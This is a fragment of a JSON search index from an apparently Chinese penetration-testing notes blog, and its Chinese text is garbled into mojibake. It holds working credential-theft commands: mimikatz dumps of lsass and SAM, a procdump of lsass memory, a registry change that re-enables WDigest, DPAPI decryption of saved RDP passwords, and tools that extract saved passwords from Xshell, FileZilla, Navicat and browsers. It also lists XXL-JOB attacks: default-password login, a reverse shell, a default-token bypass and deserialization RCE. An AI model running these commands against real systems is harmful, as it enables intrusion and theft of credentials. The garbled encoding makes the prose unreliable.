æŸ¥çœ‹ä¸»æœºä¸å…¶ä»–ä¸»æœºè¿œç¨‹å»ºç«‹çš„ç½‘ç»œå…±äº«è¿æ¥\nnet use æŸ¥çœ‹å½“å‰è¿›ç¨‹ä¿¡æ¯ æŸ¥çœ‹å½“å‰ä¸»æœºæ‰€æœ‰è¿›ç¨‹ä¿¡æ¯\ntasklist å¯ä»¥é’ˆå¯¹è¿›ç¨‹ä¿¡æ¯è¿›è¡Œæ€è½¯è¯†åˆ«\nä¹Ÿå¯ä»¥ç”¨WMIC:\nwmic process get name, ProcessID, ExecutablePath æŸ¥çœ‹å½“å‰æœåŠ¡ä¿¡æ¯ æŸ¥çœ‹å½“å‰æ‰€æœ‰æœåŠ¡ä¿¡æ¯ï¼Œè¿‡æ»¤å‡ºæœåŠ¡åç§°ã€è·¯å¾„ã€åˆ›å»ºæ—¶é—´ã€è¿è¡ŒçŠ¶æ€ä¿¡æ¯\nwmic service get Caption,Name,PathName,StartName,State æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ä¿¡æ¯ æŸ¥çœ‹ä¸»æœºä¸Šæ‰€æœ‰çš„è®¡åˆ’ä»»åŠ¡ï¼š\n"
    }
,
    {
        "title": "å†…ç½‘ä¿¡æ¯æ”¶é›†-ç”¨æˆ·å‡­æ®æ”¶é›†",
        "link": "/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE%E6%94%B6%E9%9B%86/",
        "content": "å†…ç½‘ä¿¡æ¯æ”¶é›†-ç”¨æˆ·å‡­æ®æ”¶é›† è¿™æ˜¯å†…ç½‘æ¸—é€ä¸­å¾ˆé‡è¦çš„ä¸€æ­¥ï¼Œå¾ˆå¤šæ“ä½œéƒ½éœ€è¦ç”¨æˆ·å‡­æ®\næ³¨ï¼šè¿™é‡Œçš„æ”¶é›†å¤§å¤šéœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œæ‰€ä»¥éœ€è¦é…åˆæƒé™æå‡\nè·å–åŸŸå†…å•æœºå¯†ç å’Œå“ˆå¸Œ åœ¨å‰é¢ä»‹ç»NTLMåè®®æ—¶ä»‹ç»è¿‡windowsçš„NTLMæœ¬åœ°è®¤è¯æµç¨‹ï¼ŒWindowsåè®®ä¹‹NTLMï¼š\nåœ¨ç”¨æˆ·è¾“å…¥å¯†ç è¿›è¡Œèº«ä»½éªŒè¯çš„è¿‡ç¨‹ä¸­ï¼Œæ‰€æœ‰æ“ä½œéƒ½æ˜¯åœ¨æœ¬åœ°è¿›è¡Œçš„ã€‚ç³»ç»Ÿå°†ç”¨æˆ·è¾“å…¥çš„å¯†ç è½¬æ¢ä¸ºNTLM Hashï¼Œå†å°†å…¶ä¸SAMä¸­çš„NTLM Hashæ–‡ä»¶è¿›è¡Œæ¯”è¾ƒï¼Œè‹¥ç›¸åŒåˆ™è¯´æ˜å¯†ç æ­£ç¡®ï¼Œåä¹‹åˆ™ä¸ºé”™è¯¯ã€‚å½“ç”¨æˆ·æ³¨é”€ã€é‡å¯ã€é”å±åï¼Œæ“ä½œç³»ç»Ÿä¼šè®©winlog.exeæ˜¾ç¤ºç™»é™†ç•Œé¢ï¼Œå³å¯†ç è¾“å…¥æ¡†ï¼Œåœ¨winlog.exeç¨‹åºæ¥æ”¶åˆ°è¾“å…¥ä¹‹åï¼Œä¼šå°†å¯†ç äº¤ç»™lsass.exeè¿›ç¨‹ï¼Œlsass.exeè¿›ç¨‹ä¸­ä¼šå­˜å‚¨ä¸€ä»½æ˜æ–‡å¯†ç ï¼Œå¹¶å°†å…¶åŠ å¯†æˆNTLM Hashï¼Œä¸SAMæ•°æ®åº“è¿›è¡Œæ¯”è¾ƒå’Œè®¤è¯\nåœ¨ä¸Šè¿°è¿‡ç¨‹ä¸­ï¼Œæœ‰ä¸ªlsass.exeè¿›ç¨‹ï¼Œæˆ‘ä»¬åœ¨æ¸—é€è¿‡ç¨‹ä¸­ä½¿ç”¨çš„Mimikatzå°±æ˜¯ä»è¯¥è¿›ç¨‹ä¸­æŠ“å–çš„æ˜æ–‡æˆ–Hashå¯†ç \nè¿™é‡Œè¯¦ç»†è®°å½•åœ¨å¦‚ä½•ä½¿ç”¨mimikatzè¿›è¡Œä¿¡æ¯æ”¶é›†ï¼š\nåœ¨çº¿è¯»å–lsassè¿›ç¨‹ å°†mimikatzä¸Šä¼ è‡³ç›®æ ‡ä¸»æœºåï¼Œå‘½ä»¤è¡Œå¯åŠ¨ï¼š\nmimikatz.exe \u0026#34;privilege::debug\u0026#34; \u0026#34;sekurlsa::logonpasswords full\u0026#34; exit # \u0026#34;privilege::debug\u0026#34;ç”¨äºæå‡è‡³DebugPrivilegeæƒé™(éœ€è¦ç®¡ç†å‘˜æƒé™) # \u0026#34;sekurlsa::logonpasswords full\u0026#34;ç”¨äºå¯¼å‡ºç”¨æˆ·å‡­æ® æ¯”å¦‚è¿™é‡ŒæŠ“å–åˆ°NTLM hashï¼Œå°è¯•è§£å¯†ï¼š\nå³å¯è·å¾—æ˜æ–‡å¯†ç \nç¦»çº¿è¯»å–lsasså†…å­˜æ–‡ä»¶ ä¹Ÿå¯ä»¥å°†lsassçš„è¿›ç¨‹å†…å­˜è½¬å‚¨ï¼Œå¯¼å‡ºåˆ°æœ¬åœ°åä½¿ç”¨mimikatzç¦»çº¿è¯»å–\nè¿™é‡Œé€‰æ‹©å¾®è½¯å®˜æ–¹çš„ProcDumpè¿›è¡Œå†…å­˜è½¬å‚¨ï¼Œé¦–å…ˆå°†procdumpä¸Šä¼ è‡³ç›®æ ‡ä¸»æœºï¼Œå‘½ä»¤è¡Œå¯åŠ¨ï¼š\nprocdump.exe -accepteula -ma lsass.exe lsass.dmp æ¥ä¸‹æ¥å°†lsass.dmpæ”¾åˆ°æœ¬åœ°ç¦»çº¿è¯»å–ï¼š\nmimikatz.exe \u0026#34;sekurlsa::minidump lsass.dmp\u0026#34; \u0026#34;sekurlsa::logonpasswords full\u0026#34; exit # \u0026#34;sekurlsa::minidump lsass.dmp\u0026#34;ç”¨äºåŠ è½½å†…å­˜æ–‡ä»¶ # \u0026#34;sekurlsa::logonpasswords full\u0026#34;ç”¨äºå¯¼å‡ºç”¨æˆ·å‡­æ® åœ¨ä¸Šé¢çš„æŠ“å–è¿‡ç¨‹ä¸­å¯ä»¥çœ‹è§ï¼ŒwdigeståŠŸèƒ½ä¸­æŠ“å–ä¸åˆ°æ˜æ–‡å¯†ç ï¼Œå› ä¸ºå¾®è½¯åœ¨2014å¹´5æœˆå‘å¸ƒäº†è¡¥ä¸ï¼Œå…³é—­äº†wdigeståŠŸèƒ½ï¼Œç¦æ­¢ä»å†…å­˜ä¸­è·å–æ˜æ–‡å¯†ç ï¼Œä¸”windows server 2012åŠä»¥ä¸Šç‰ˆæœ¬é»˜è®¤å…³é—­äº†wdigeståŠŸèƒ½\nå¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œå¯ä»¥é‡æ–°å¼€å¯wdigeståŠŸèƒ½ï¼š\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f # å¼€å¯wdigest åœ¨å¼€å¯wdigeståï¼Œè‹¥ä¸»æœºå†æ¬¡è§¦å‘æœ¬åœ°è®¤è¯æ“ä½œï¼ˆæ¯”å¦‚ç¡çœ åé‡æ–°ç™»å½•ï¼‰ï¼Œåˆ™å¯æŠ“å–æ˜æ–‡å¯†ç ï¼š\nåœ¨çº¿è¯»å–SAMæ–‡ä»¶ è¯»å–SAMæ–‡ä»¶ä¸­ä¿å­˜çš„ç”¨æˆ·ç™»å½•å‡­æ®ï¼Œå¯ä»¥å¯¼å‡ºå½“å‰ç³»ç»Ÿä¸­æ‰€æœ‰æœ¬åœ°ç”¨æˆ·çš„hashï¼š\nmimikatz.exe \u0026#34;privilege::debug\u0026#34; \u0026#34;token::elevate\u0026#34; \u0026#34;lsadump::sam\u0026#34; exit # \u0026#34;privilege::debug\u0026#34;ç”¨äºæå‡è‡³DebugPrivilegeæƒé™ # \u0026#34;token::elevate\u0026#34;ç”¨äºæå‡è‡³SYSTEMæƒé™ # \u0026#34;lsadump::sam\u0026#34;ç”¨äºè¯»å–æœ¬åœ°SAMæ–‡ä»¶ ç¦»çº¿è¯»å–æœ¬åœ°SAMæ–‡ä»¶ å°†SAMæ–‡ä»¶å¯¼å‡ºå¹¶ä½¿ç”¨mimikatzåŠ è½½å¹¶è¯»å–å…¶ä¸­çš„ç”¨æˆ·ç™»å½•å‡­æ®ç­‰ä¿¡æ¯ï¼Œä½†å¾®è½¯ä¸ºäº†æé«˜SAMæ–‡ä»¶å®‰å…¨æ€§ï¼Œä¼šå¯¹SAMæ–‡ä»¶ä½¿ç”¨å¯†é’¥åŠ å¯†ï¼Œè¯¥å¯†é’¥å­˜å‚¨äºäºSAMåŒç›®å½•ä¸‹çš„SYSTEMæ–‡ä»¶ä¸­\né‚£ä¹ˆé¦–å…ˆéœ€è¦å¯¼å‡ºSYSTEMå’ŒSAMæ–‡ä»¶ï¼Œä½†è¿™ä¸¤ä¸ªæ–‡ä»¶æ˜¯è¢«é”å®šçš„ï¼Œæ‰€ä»¥éœ€è¦å€ŸåŠ©å·¥å…·å®ç°ï¼Œè¿™é‡Œä½¿ç”¨powersploitä¸­çš„invoke-NinjaCopy.ps1\nä½†powershellçš„é»˜è®¤æ‰§è¡Œç­–ç•¥ä¸ºRestrictedï¼ˆå—é™ï¼‰ï¼š\næ­¤çŠ¶æ€ä¸‹æ— æ³•å¯¼å…¥powershellè„šæœ¬ï¼Œéœ€è¦æ›´æ”¹æ‰§è¡Œç­–ç•¥ï¼š\nSet-ExecutionPolicy Unrestricted æ¥ä¸‹æ¥å¯¼å…¥psè„šæœ¬ï¼š\nImport-Module .\\Invoke-NinjaCopy.ps1 ç„¶åå¯¼å‡ºSAMå’ŒSYSTEMæ–‡ä»¶ï¼š\nInvoke-NinjaCopy -Path \u0026#34;C:\\windows\\System32\\config\\SAM\u0026#34; -LocalDestination C:\\Temp\\SAM Invoke-NinjaCopy -Path \u0026#34;C:\\windows\\System32\\config\\SAM\u0026#34; -LocalDestination C:\\Temp\\SYSTEM è¿™é‡Œæœ‰ä¸ªç¼ºç‚¹å³é«˜ç‰ˆæœ¬windowsï¼ˆwin10åŠä»¥ä¸Šï¼‰æ‰§è¡Œè¯¥psè„šæœ¬ä¼šå‡ºé”™ï¼ˆæœ¬äººè¿˜æ²¡ææ‡‚åŸå› ï¼‰ï¼š æ­¤å¤–ï¼ŒCVE-2021-36934å¯ä»¥ææƒç›´æ¥è¯»å–SAMå’ŒSYSTEMæ–‡ä»¶ï¼Œåé¢ææƒæ–‡ç« å†ç»†å—¦\nåœ¨å…·æœ‰ç®¡ç†å‘˜æƒé™çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡ä¿å­˜æ³¨å†Œè¡¨çš„å½¢å¼å¯¼å‡ºï¼š\nreg save HKLM\\SAM sam.hive reg save HKLM\\SYSTEM system.hive å¯¼å‡ºåä½¿ç”¨mimikatzåŠ è½½å¹¶è¯»å–SAMä¸­çš„ç”¨æˆ·å‡­æ®ä¿¡æ¯ï¼š\nmimikatz.exe \u0026#34;lsadump::sam /sam:sam.hive /system:system.hive\u0026#34; exit è·å–å¸¸è§åº”ç”¨è½¯ä»¶å‡­æ® ä¸»æœºä¸­å¯èƒ½ä¼šå­˜åœ¨ä¸€äº›ç‰¹å®šçš„åº”ç”¨ç¨‹åºæ¥å­˜å‚¨å¯†ç ï¼Œå¯ä»¥å°è¯•è¿›è¡Œè·å–\nè·å–RDPä¿å­˜çš„å‡­æ® è‹¥ç”¨æˆ·åœ¨RDPç™»é™†æ—¶ï¼Œå‹¾é€‰äº†ä¿å­˜è¿æ¥å‡­è¯ï¼Œå‡­æ®ä¾¿ä¼šä½¿ç”¨æ•°æ®ä¿æŠ¤APIä»¥åŠ å¯†çš„å½¢å¼å­˜å‚¨åœ¨windowsçš„å‡­æ®ç®¡ç†å™¨ä¸­ï¼Œè·¯å¾„ä¸º%USERPROFILE%\\AppData\\Local\\Microsoft\\Credentials\næŸ¥çœ‹å½“å‰ä¸»æœºä¿å­˜çš„æ‰€æœ‰è¿æ¥å‡­è¯ï¼š\ncmdkey /list # æŸ¥çœ‹å½“å‰ä¿å­˜çš„å‡­æ® dir /a %USERPROFILE%\\AppData\\Local\\Microsoft\\Credentials\\* # éå†Credentialsä¸­ä¿å­˜çš„å‡­æ® mimikatzè§£æè¯¥å‡­è¯3E039BFD58331448709CE3225E1724AFï¼š\nmimikatz.exe \u0026#34;privilege::debug\u0026#34; \u0026#34;dpapi::cred /in:%USERPROFILE%\\AppData\\Local\\Microsoft\\Credentials\\3E039BFD58331448709CE3225E1724AF\u0026#34; exit å…¶ä¸­pbDataå°±æ˜¯å‡­æ®çš„åŠ å¯†æ•°æ®ï¼ŒguidMasterKeyæ˜¯è¯¥å‡­æ®çš„GUIDï¼Œè¿™é‡Œè®°ä½guidMasterKeyï¼š{ba5eb8b7-53cf-4452-bf99-44b3402b8fc1}\næ¥ä¸‹æ¥æ‰§è¡Œï¼š\nmimikatz.exe \u0026#34;privilege::debug\u0026#34; \u0026#34;sekurlsa::dpapi\u0026#34; exit è¿™é‡Œå¯ä»¥æ‰¾åˆ°å’ŒguidMasterKeyç›¸å…³çš„MasterKeyï¼š1ea718de5687d36dba4fbf83c158ca9413dda53ed06170242c1779fdc39e8fec7f093148fbf9017e0e6b20d5b3655efd21ac74c430bf69396bbcb67d1beb6bed\nä½†æˆ‘åœ¨windows11ä¸Šmimkatzä¼šæŠ¥é”™ï¼ˆwin10è¯•è¿‡äº†ï¼Œä¹Ÿä¸ä¼šæŠ¥é”™ï¼‰ï¼š\næ¥ä¸‹æ¥ç”¨æ‹¿åˆ°çš„MasterKeyæ‰§è¡Œå‘½ä»¤ï¼š\nmimikatz.exe \u0026#34;privilege::debug\u0026#34; \u0026#34;dpapi::cred /in:%USERPROFILE%\\AppData\\Local\\Microsoft\\Credentials\\3E039BFD58331448709CE3225E1724AF /masterkey:1ea718de5687d36dba4fbf83c158ca9413dda53ed06170242c1779fdc39e8fec7f093148fbf9017e0e6b20d5b3655efd21ac74c430bf69396bbcb67d1beb6bed\u0026#34; exit æˆåŠŸè·å–åˆ°RDPå‡­è¯çš„administratorå¯†ç ï¼šAdmin123456\nè·å–Xshellä¿å­˜çš„å‡­æ® Xshellä¼šå°†æœåŠ¡å™¨è¿æ¥ä¿¡æ¯ä¿å­˜åœ¨sessionç›®å½•ä¸‹çš„.xshæ–‡ä»¶ä¸­ï¼š\nå¦‚æœç”¨æˆ·è¿æ¥æ—¶å‹¾é€‰äº†è®°ä½ç”¨æˆ·å/å¯†ç ï¼Œé‚£ä¹ˆè¯¥æ–‡ä»¶ä¼šä¿å­˜è¿œç¨‹æœåŠ¡å™¨è¿æ¥çš„ç”¨æˆ·åå’ŒåŠ å¯†åçš„å¯†ç \nå¯ä»¥ä½¿ç”¨SharpXDecryptè¿›è¡Œå‡­æ®è·å–ï¼Œä¸Šä¼ åˆ°ä¸»æœºæ‰§è¡Œå³å¯ï¼š\n.\\SharpXDecrypt.exe è·å–FileZillaä¿å­˜çš„å‡­æ® æ— éœ€å¤šè¨€ï¼Œåˆ©ç”¨SharpDecryptPwdç›´æ¥è·å–å¯†ç  å·¥å…·ä¸‹è½½åœ°å€ï¼šhttps://github.com/uknowsec/SharpDecryptPwd\nSharpDecryptPwd.exe -FileZilla è·å–NaviCatä¿å­˜çš„å‡­æ® ä¾æ—§æ˜¯SharpDecryptPwdï¼š\nSharpDecryptPwd.exe -NavicatCrypto è·å–æµè§ˆå™¨ä¿å­˜çš„å‡­æ® webæµè§ˆå™¨æœ‰ä¿å­˜å¯†ç çš„åŠŸèƒ½\nå¯ä»¥ä½¿ç”¨hackbrowserdataè·å–å¯†ç \nä¸‰å¤§æµè§ˆå™¨æ•°æ®éƒ½å¯ä»¥æ”¶é›†ï¼Œä¸åªå¯†ç ï¼š ",
        "summary": "å†…ç½‘ä¿¡æ¯æ”¶é›†-ç”¨æˆ·å‡­æ®æ”¶é›† è¿™æ˜¯å†…ç½‘æ¸—é€ä¸­å¾ˆé‡è¦çš„ä¸€æ­¥ï¼Œå¾ˆå¤šæ“ä½œéƒ½éœ€è¦ç”¨æˆ·å‡­æ®\næ³¨ï¼šè¿™é‡Œçš„æ”¶é›†å¤§å¤šéœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œæ‰€ä»¥éœ€è¦é…åˆæƒé™æå‡\nè·å–åŸŸå†…å•æœºå¯†ç å’Œå“ˆå¸Œ åœ¨å‰é¢ä»‹ç»NTLMåè®®æ—¶ä»‹ç»è¿‡windowsçš„NTLMæœ¬åœ°è®¤è¯æµç¨‹ï¼ŒWindowsåè®®ä¹‹NTLMï¼š\nåœ¨ç”¨æˆ·è¾“å…¥å¯†ç è¿›è¡Œèº«ä»½éªŒè¯çš„è¿‡ç¨‹ä¸­ï¼Œæ‰€æœ‰æ“ä½œéƒ½æ˜¯åœ¨æœ¬åœ°è¿›è¡Œçš„ã€‚ç³»ç»Ÿå°†ç”¨æˆ·è¾“å…¥çš„å¯†ç è½¬æ¢ä¸ºNTLM Hashï¼Œå†å°†å…¶ä¸SAMä¸­çš„NTLM Hashæ–‡ä»¶è¿›è¡Œæ¯”è¾ƒï¼Œè‹¥ç›¸åŒåˆ™è¯´æ˜å¯†ç æ­£ç¡®ï¼Œåä¹‹åˆ™ä¸ºé”™è¯¯ã€‚å½“ç”¨æˆ·æ³¨é”€ã€é‡å¯ã€é”å±åï¼Œæ“ä½œç³»ç»Ÿä¼šè®©winlog.exeæ˜¾ç¤ºç™»é™†ç•Œé¢ï¼Œå³å¯†ç è¾“å…¥æ¡†ï¼Œåœ¨winlog.exeç¨‹åºæ¥æ”¶åˆ°è¾“å…¥ä¹‹åï¼Œä¼šå°†å¯†ç äº¤ç»™lsass.exeè¿›ç¨‹ï¼Œlsass.exeè¿›ç¨‹ä¸­ä¼šå­˜å‚¨ä¸€ä»½æ˜æ–‡å¯†ç ï¼Œå¹¶å°†å…¶åŠ å¯†æˆNTLM Hashï¼Œä¸SAMæ•°æ®åº“è¿›è¡Œæ¯”è¾ƒå’Œè®¤è¯\nåœ¨ä¸Šè¿°è¿‡ç¨‹ä¸­ï¼Œæœ‰ä¸ªlsass.exeè¿›ç¨‹ï¼Œæˆ‘ä»¬åœ¨æ¸—é€è¿‡ç¨‹ä¸­ä½¿ç”¨çš„Mimikatzå°±æ˜¯ä»è¯¥è¿›ç¨‹ä¸­æŠ“å–çš„æ˜æ–‡æˆ–Hashå¯†ç \nè¿™é‡Œè¯¦ç»†è®°å½•åœ¨å¦‚ä½•ä½¿ç”¨mimikatzè¿›è¡Œä¿¡æ¯æ”¶é›†ï¼š\nåœ¨çº¿è¯»å–lsassè¿›ç¨‹ å°†mimikatzä¸Šä¼ è‡³ç›®æ ‡ä¸»æœºåï¼Œå‘½ä»¤è¡Œå¯åŠ¨ï¼š\nmimikatz.exe \u0026#34;privilege::debug\u0026#34; \u0026#34;sekurlsa::logonpasswords full\u0026#34; exit # \u0026#34;privilege::debug\u0026#34;ç”¨äºæå‡è‡³DebugPrivilegeæƒé™(éœ€è¦ç®¡ç†å‘˜æƒé™) # \u0026#34;sekurlsa::logonpasswords full\u0026#34;ç”¨äºå¯¼å‡ºç”¨æˆ·å‡­æ® æ¯”å¦‚è¿™é‡ŒæŠ“å–åˆ°NTLM hashï¼Œå°è¯•è§£å¯†ï¼š\nå³å¯è·å¾—æ˜æ–‡å¯†ç \nç¦»çº¿è¯»å–lsasså†…å­˜æ–‡ä»¶ ä¹Ÿå¯ä»¥å°†lsassçš„è¿›ç¨‹å†…å­˜è½¬å‚¨ï¼Œå¯¼å‡ºåˆ°æœ¬åœ°åä½¿ç”¨mimikatzç¦»çº¿è¯»å–\nè¿™é‡Œé€‰æ‹©å¾®è½¯å®˜æ–¹çš„ProcDumpè¿›è¡Œå†…å­˜è½¬å‚¨ï¼Œé¦–å…ˆå°†procdumpä¸Šä¼ è‡³ç›®æ ‡ä¸»æœºï¼Œå‘½ä»¤è¡Œå¯åŠ¨ï¼š\nprocdump.exe -accepteula -ma lsass.exe lsass.dmp æ¥ä¸‹æ¥å°†lsass.dmpæ”¾åˆ°æœ¬åœ°ç¦»çº¿è¯»å–ï¼š\nmimikatz.exe \u0026#34;sekurlsa::minidump lsass.dmp\u0026#34; \u0026#34;sekurlsa::logonpasswords full\u0026#34; exit # \u0026#34;sekurlsa::minidump lsass.dmp\u0026#34;ç”¨äºåŠ è½½å†…å­˜æ–‡ä»¶ # \u0026#34;sekurlsa::logonpasswords full\u0026#34;ç”¨äºå¯¼å‡ºç”¨æˆ·å‡­æ® åœ¨ä¸Šé¢çš„æŠ“å–è¿‡ç¨‹ä¸­å¯ä»¥çœ‹è§ï¼ŒwdigeståŠŸèƒ½ä¸­æŠ“å–ä¸åˆ°æ˜æ–‡å¯†ç ï¼Œå› ä¸ºå¾®è½¯åœ¨2014å¹´5æœˆå‘å¸ƒäº†è¡¥ä¸ï¼Œå…³é—­äº†wdigeståŠŸèƒ½ï¼Œç¦æ­¢ä»å†…å­˜ä¸­è·å–æ˜æ–‡å¯†ç ï¼Œä¸”windows server 2012åŠä»¥ä¸Šç‰ˆæœ¬é»˜è®¤å…³é—­äº†wdigeståŠŸèƒ½\nå¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œå¯ä»¥é‡æ–°å¼€å¯wdigeståŠŸèƒ½ï¼š\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f # å¼€å¯wdigest åœ¨å¼€å¯wdigeståï¼Œè‹¥ä¸»æœºå†æ¬¡è§¦å‘æœ¬åœ°è®¤è¯æ“ä½œï¼ˆæ¯”å¦‚ç¡çœ åé‡æ–°ç™»å½•ï¼‰ï¼Œåˆ™å¯æŠ“å–æ˜æ–‡å¯†ç ï¼š\nåœ¨çº¿è¯»å–SAMæ–‡ä»¶ è¯»å–SAMæ–‡ä»¶ä¸­ä¿å­˜çš„ç”¨æˆ·ç™»å½•å‡­æ®ï¼Œå¯ä»¥å¯¼å‡ºå½“å‰ç³»ç»Ÿä¸­æ‰€æœ‰æœ¬åœ°ç”¨æˆ·çš„hashï¼š\nmimikatz.exe \u0026#34;privilege::debug\u0026#34; \u0026#34;token::elevate\u0026#34; \u0026#34;lsadump::sam\u0026#34; exit # \u0026#34;privilege::debug\u0026#34;ç”¨äºæå‡è‡³DebugPrivilegeæƒé™ # \u0026#34;token::elevate\u0026#34;ç”¨äºæå‡è‡³SYSTEMæƒé™ # \u0026#34;lsadump::sam\u0026#34;ç”¨äºè¯»å–æœ¬åœ°SAMæ–‡ä»¶ ç¦»çº¿è¯»å–æœ¬åœ°SAMæ–‡ä»¶ å°†SAMæ–‡ä»¶å¯¼å‡ºå¹¶ä½¿ç”¨mimikatzåŠ è½½å¹¶è¯»å–å…¶ä¸­çš„ç”¨æˆ·ç™»å½•å‡­æ®ç­‰ä¿¡æ¯ï¼Œä½†å¾®è½¯ä¸ºäº†æé«˜SAMæ–‡ä»¶å®‰å…¨æ€§ï¼Œä¼šå¯¹SAMæ–‡ä»¶ä½¿ç”¨å¯†é’¥åŠ å¯†ï¼Œè¯¥å¯†é’¥å­˜å‚¨äºäºSAMåŒç›®å½•ä¸‹çš„SYSTEMæ–‡ä»¶ä¸­\n"
    }
,
    {
        "title": "å†…ç½‘å¸¸è§æœåŠ¡çš„æ¼æ´æ€»ç»“",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1/%E5%86%85%E7%BD%91%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/",
        "content": "å†…ç½‘å¸¸è§æœåŠ¡çš„æ¼æ´æ€»ç»“ ç”±äº6s6å¸ˆå‚…åœ¨é¢è¯•æ­å·æŸ60æ—¶è¢«æ‹·æ‰“äº†å¾ˆå¤šå†…ç½‘å¸¸è§æœåŠ¡çš„æ¼æ´ï¼Œæˆ‘è§‰å¾—è¿˜æ˜¯å¾—ä¸Šæ‰‹å®æ“å¹¶æ€»ç»“ä¸€ä¸‹ï¼Œäºæ˜¯æœ‰äº†è¿™ç¯‡ç¬”è®°\nXXL-JOB ä»‹ç» xxl-jobæ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼ä»»åŠ¡è°ƒåº¦å¹³å°ï¼Œæœ‰ä¸¤ä¸ªæ ¸å¿ƒæ¨¡å—ï¼š\nè°ƒåº¦ä¸­å¿ƒadminï¼Œé»˜è®¤ç«¯å£8080ï¼Œè´Ÿè´£ç®¡ç†è°ƒåº¦ä¿¡æ¯ç­‰æ“ä½œ æ‰§è¡Œå™¨executorï¼Œé»˜è®¤ç«¯å£9999ï¼Œè´Ÿè´£ä»»åŠ¡æ‰§è¡Œï¼Œæ¥æ”¶è°ƒåº¦ä¸­å¿ƒçš„è¯·æ±‚ ç‰¹å¾ fofaè¯­æ³•ï¼š\nicon_hash=\u0026#34;1691956220\u0026#34; || app=\u0026#34;xxl-job\u0026#34; é¡µé¢ç‰¹å¾ï¼š\nå›¾æ ‡ç‰¹å¾ï¼š\nå¸¸è§æ¼æ´ å¼±å£ä»¤ xxl-jobçš„åˆå§‹åŒ–sqlè¯­å¥è®¾å®šäº†é»˜è®¤å¯†ç admin/123456ï¼Œå¹¶ä¸”ç™»å½•åä¸ä¼šæç¤ºä¿®æ”¹é»˜è®¤å¯†ç \nè¿™æ ·å¯ä»¥ç›´æ¥è¿›å…¥åå°ï¼š åå°è®¡åˆ’ä»»åŠ¡getshell ç™»å½•æˆåŠŸåå¯ä»¥åœ¨ä»»åŠ¡ç®¡ç†å¤„åˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼š åœ¨GLUEIDEå¤„ç¼–è¾‘å‘½ä»¤ï¼š\nå†™å…¥åå¼¹shellçš„å‘½ä»¤ï¼š\nç„¶åå›åˆ°ç®¡ç†é¡µé¢é€‰æ‹©æ‰§è¡Œä¸€æ¬¡ï¼š\nå³å¯åå¼¹shellï¼š\nExecutor Restful APIæœªæˆæƒè®¿é—®RCE å‰é¢æåˆ°äº†xxl-jobåˆ†ä¸ºadminå’Œexecutorï¼Œè€Œexecutoré»˜è®¤æ²¡æœ‰é…ç½®è®¤è¯ï¼Œæœªæˆæƒçš„æ”»å‡»è€…å¯ä»¥é€šè¿‡RESTful APIæ‰§è¡Œä»»æ„å‘½ä»¤\né»˜è®¤accessTokenèº«ä»½ç»•è¿‡ ä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆç»å…¸çš„æ¼æ´åœºæ™¯ï¼ŒaccessTokenæ˜¯ä¸ºäº†ä¿®å¤XXL-JOB Executor Restful API æœªæˆæƒè®¿é—®å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œä¸ºäº†é˜²æ­¢å…¶æœªæˆæƒæ·»åŠ äº†accessTokenæ ¡éªŒï¼Œä½†æ˜¯å¾ˆå¤šäººåœ¨ä½¿ç”¨è¯¥æ¡†æ¶çš„æ—¶å€™å¹¶æœªä¿®æ”¹å…¶é»˜è®¤çš„å€¼xxl.job.accessToken=default_tokenï¼Œæ‰€ä»¥åªéœ€è¦åœ¨è¯·æ±‚å¤´ä¸­æ·»åŠ XXL-JOB-ACCESS-TOKEN: default_token å³å¯ç»•è¿‡èº«ä»½æ ¡éªŒ\napiæœªæˆæƒHessian2ååºåˆ—åŒ– å³xxl-jobçš„/apiè·¯ç”±å¯ä»¥æœªæˆæƒè®¿é—®ï¼Œè€Œè¯¥æ¥å£ä¼šè¿›è¡ŒHessian2ååºåˆ—åŒ–æ“ä½œï¼Œå¯ä»¥åˆ©ç”¨Hessian2ååºåˆ—åŒ–æ¼æ´è¿›è¡ŒRCE\næœªæˆæƒæƒ…å†µçš„APIç•Œé¢å¦‚ä¸‹\nä¸€æŠŠæ¢­å‘½ä»¤æ‰§è¡Œï¼š\nNacos ä»‹ç» Nacosæ˜¯ä¸€ä¸ªæ›´æ˜“äºæ„å»ºäº‘åŸç”Ÿåº”ç”¨çš„åŠ¨æ€æœåŠ¡å‘ç°ã€é…ç½®ç®¡ç†å’ŒæœåŠ¡ç®¡ç†å¹³å°ï¼Œç”±é˜¿é‡Œå·´å·´å¼€æºï¼Œä¸€èˆ¬åœ¨å†…ç½‘ç³»ç»Ÿä¸­æ¯”è¾ƒå¸¸è§\nnacoséƒ¨ç½²éœ€è¦å¼€æ”¾ä»¥ä¸‹ç«¯å£ï¼š\nä¸»ç«¯å£ï¼šé»˜è®¤8848ï¼Œç®¡ç†é¡µé¢çš„ä¸»å…¥å£ gRPCæœåŠ¡å®¢æˆ·ç«¯ç«¯å£ï¼šé»˜è®¤9848ï¼Œç”¨äºå®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘èµ·gRPCè¿æ¥å’Œè¯·æ±‚ 